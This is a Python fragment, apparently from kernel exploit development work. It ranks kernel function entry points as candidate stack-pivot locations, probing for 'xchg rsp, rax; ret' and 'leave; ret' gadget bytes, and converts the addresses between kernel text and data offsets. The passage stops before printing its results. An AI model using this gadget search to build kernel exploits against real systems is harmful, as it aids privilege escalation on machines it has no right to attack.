# Compute gaps and find best pivot probe targets
# For xchg rsp, rax; ret (48 94 C3), we probe at entry - 3
# For leave; ret (C9 C3), we probe at entry - 2

# kdata_base - ktext_base = 0xC00000 (from LSTAR calc)
# So ktext+X = kdata_base + (X - 0xC00000)
KDATA_TO_KTEXT = 0xC00000

print("=" * 70)
print("PRIORITY PIVOT TARGETS (entry-3, testing for 48 94 C3)")
print("Sorted by gap size (larger = preceding function is bigger = safer)")
print("=" * 70)
print()

targets = []
for i in range(1, len(entries)):
    gap = entries[i] - entries[i-1]
    if gap < 8:
        continue  # skip tiny stubs (8-byte = likely mov eax,N; ret)

    entry = entries[i]
    probe_ktext = entry - 3
    kdata_off = probe_ktext - KDATA_TO_KTEXT  # negative

    # Classify region
    if entry < 0x100000:
        region = "IDT handlers"
    elif entry < 0x280000:
        region = "misc ktext"
    elif entry < 0x2a1000:
        region = "syscall/ops"
    else:
        region = "late ktext"

    targets.append((gap, entry, probe_ktext, kdata_off, region))

# Sort by gap (largest first) = most promising
targets.sort(key=lambda x: -x[0])

# Print top 40
